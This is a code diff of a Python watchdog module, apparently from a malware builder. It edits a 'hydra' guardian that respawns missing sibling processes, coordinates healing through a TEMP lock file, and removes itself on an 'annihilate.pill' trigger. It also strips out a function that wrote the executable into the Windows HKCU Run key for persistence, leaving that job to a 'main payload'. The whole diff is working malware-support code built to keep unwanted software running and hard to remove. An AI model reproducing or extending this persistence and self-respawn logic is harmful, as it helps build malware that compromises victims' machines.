@@ -19,14 +19,14 @@ except ImportError:
 
 # --- INJECTED BY BUILDER ---
 HYDRA_GUARDIANS = {{HYDRA_GUARDIANS}}
-PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
+PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}} # Note: No longer used by guardian, kept for compatibility
 TERMINATE_FLAG = False
 
 def _perform_total_annihilation(stealth_dir):
     global TERMINATE_FLAG
     TERMINATE_FLAG = True
 
-    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
+    if platform.system() == "Windows" and winreg:
         try:
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
@@ -52,27 +52,17 @@ def _perform_total_annihilation(stealth_dir):
     
     sys.exit(0)
 
-def install_persistence():
-    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
-        try:
-            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            key_name = os.path.basename(sys.executable)
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, sys.executable)
-        except: pass
-
 def hydra_watchdog():
     if not psutil:
         while True:
-            time.sleep(3600)
+            time.sleep(3600) # Sleep indefinitely if psutil is not available
 
-    guardian_names = HYDRA_GUARDIANS
     my_name = os.path.basename(sys.executable)
     home_dir = os.path.dirname(sys.executable)
     heal_lock_file = os.path.join(os.environ["TEMP"], "tether_heal.lock")
     annihilation_file = os.path.join(home_dir, "annihilate.pill")
     
-    time.sleep(5)
+    time.sleep(5) # Initial delay to allow main payload to settle
 
     while not TERMINATE_FLAG:
         if os.path.exists(annihilation_file):
@@ -81,23 +71,18 @@ def hydra_watchdog():
 
         try:
             running_procs = {p.info['name'] for p in psutil.process_iter(['name'])}
-            missing_guardians = set(guardian_names) - running_procs
+            missing_guardians = set(HYDRA_GUARDIANS) - running_procs
             
             if missing_guardians:
-                # --- NEW: Healing Lock Mechanism ---
                 lock_acquired = False
                 try:
-                    if os.path.exists(heal_lock_file):
-                        if (time.time() - os.path.getmtime(heal_lock_file)) > 15:
-                            os.remove(heal_lock_file)
-                        else:
-                            time.sleep(10)
-                            continue
+                    if os.path.exists(heal_lock_file) and (time.time() - os.path.getmtime(heal_lock_file)) < 15:
+                        time.sleep(10)
+                        continue # Another guardian is likely healing
                     
                     with open(heal_lock_file, 'w') as f: f.write(str(time.time()))
                     lock_acquired = True
 
-                    # Respawn logic, only runs if this instance got the lock
                     for guardian_name in missing_guardians:
                         if guardian_name != my_name:
                             guardian_path = os.path.join(home_dir, guardian_name)
@@ -111,13 +96,6 @@ def hydra_watchdog():
         time.sleep(10)
 
 if __name__ == "__main__":
-    flag_file = os.path.join(os.environ["TEMP"], f"tether_flag_{os.path.basename(sys.executable)}.flg")
-    
-    if not os.path.exists(flag_file):
-        install_persistence()
-        try:
-            with open(flag_file, 'w') as f:
-                f.write('done')
-        except: pass
-
+    # The guardian's ONLY job is to be a watchdog.
+    # It does not handle persistence; that is the main payload's responsibility.
     hydra_watchdog()
